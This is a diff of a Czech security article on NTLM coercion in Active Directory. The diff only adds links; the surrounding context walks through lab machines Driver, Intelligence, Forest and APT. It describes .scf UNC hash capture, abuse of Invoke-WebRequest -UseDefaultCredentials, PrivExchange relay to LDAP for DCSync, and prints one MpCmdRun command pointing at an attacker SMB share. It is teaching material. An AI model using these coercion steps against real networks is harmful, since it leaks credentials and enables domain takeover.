@@ -9,7 +9,7 @@ tags: ntlm active-directory windows smb relay coercion
 
 V řadě Windows a Active Directory útoků není první cíl rovnou vzdálené spuštění kódu. Stačí přimět systém, službu nebo uživatele, aby se autentizoval proti útočníkovu serveru. Právě to je NTLM coercion: útočník nevymýšlí heslo ani neobchází login formulář, ale vytvoří situaci, ve které se cílový stroj sám přihlásí tam, kam neměl.
 
-Driver, Intelligence, Forest a APT ukazují čtyři různé varianty stejného vzorce:
+[Driver](/driver), [Intelligence](/intelligence), [Forest](/forest) a [APT](/apt) ukazují čtyři různé varianty stejného vzorce:
 
 - jednou stačí `.scf` soubor a načtení ikony přes SMB,
 - podruhé interní skript s `Invoke-WebRequest -UseDefaultCredentials`,
@@ -86,7 +86,7 @@ PrivExchange a podobné techniky jsou pokročilejší varianta stejného princip
 
 ### Driver: `.scf` soubor a hash účtu `tony`
 
-Driver je nejčistší ukázka coercion přes souborový formát. Po přihlášení do firmware portálu šlo nahrát `.scf` soubor s UNC cestou:
+[Driver](/driver) je nejčistší ukázka coercion přes souborový formát. Po přihlášení do firmware portálu šlo nahrát `.scf` soubor s UNC cestou:
 
 Prakticky k tomu, co přesně v tomhle místě dělá `Responder` a co už ne, viz i [Responder](/nastroje/responder).
 
@@ -106,7 +106,7 @@ Jakmile Windows potřeboval zobrazit ikonu, sáhl na SMB share útočníka a Res
 
 ### Intelligence: `Invoke-WebRequest -UseDefaultCredentials`
 
-Intelligence ukazuje stejný princip v mnohem nenápadnější podobě. Účet `Tiffany.Molina` mohl číst `downdetector.ps1`, skript, který pravidelně procházel DNS jména začínající na `web` a na každý záznam posílal:
+[Intelligence](/intelligence) ukazuje stejný princip v mnohem nenápadnější podobě. Účet `Tiffany.Molina` mohl číst `downdetector.ps1`, skript, který pravidelně procházel DNS jména začínající na `web` a na každý záznam posílal:
 
 ```text
 Invoke-WebRequest -UseDefaultCredentials
@@ -116,13 +116,13 @@ Jakmile šlo do DNS přidat vlastní `webthacker.intelligence.htb`, skript navá
 
 ### Forest: PrivExchange a relay do LDAP
 
-Forest ukazuje pokročilejší doménovou variantu. Účet `svc-alfresco` sám o sobě nestačil k plné doménové kompromitaci, ale BloodHound ukázal cestu přes `Exchange Windows Permissions`. Přes PrivExchange se podařilo vynutit autentizaci, kterou šlo relayovat na LDAP a změnit oprávnění účtu tak, aby získal DCSync schopnost.
+[Forest](/forest) ukazuje pokročilejší doménovou variantu. Účet `svc-alfresco` sám o sobě nestačil k plné doménové kompromitaci, ale BloodHound ukázal cestu přes `Exchange Windows Permissions`. Přes PrivExchange se podařilo vynutit autentizaci, kterou šlo relayovat na LDAP a změnit oprávnění účtu tak, aby získal DCSync schopnost.
 
 To je dobrá připomínka, že coercion nemusí končit u crackování hashe. Pokud protistrana dovolí relay, je možné z vynucené autentizace udělat rovnou změnu stavu v doméně.
 
 ### APT: machine account `APT$` a UNC cesta
 
-APT přidává ještě jinou důležitou vrstvu: coercion nemusí získat jen lidský účet. Přes UNC cestu se podařilo přinutit obranný proces, aby sáhl na útočníkův share:
+[APT](/apt) přidává ještě jinou důležitou vrstvu: coercion nemusí získat jen lidský účet. Přes UNC cestu se podařilo přinutit obranný proces, aby sáhl na útočníkův share:
 
 ```text
 cmd /C C:\Users\"All Users"\Microsoft\"Windows Defender"\platform\4.18.2010.7-0\X86\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.7\\hello\\win.exe
@@ -138,7 +138,7 @@ Coercion znamená "přinutit někoho se autentizovat". Relay znamená "použít 
 
 ### Coercion není totéž co UNC RFI nebo include
 
-Sniper dobře ukazuje příbuzný, ale jiný vzorec. UNC cesta tam vedla k vzdálenému includu PHP souboru a k vykonání kódu. To není coercion v úzkém slova smyslu. Je to jiná forma důvěry v síťovou cestu. Prakticky se vyplatí tyto kategorie nemíchat, i když používají podobný vstup.
+[Sniper](/sniper) dobře ukazuje příbuzný, ale jiný vzorec. UNC cesta tam vedla k vzdálenému includu PHP souboru a k vykonání kódu. To není coercion v úzkém slova smyslu. Je to jiná forma důvěry v síťovou cestu. Prakticky se vyplatí tyto kategorie nemíchat, i když používají podobný vstup.
 
 ### Zachycený hash ještě neznamená přístup
 
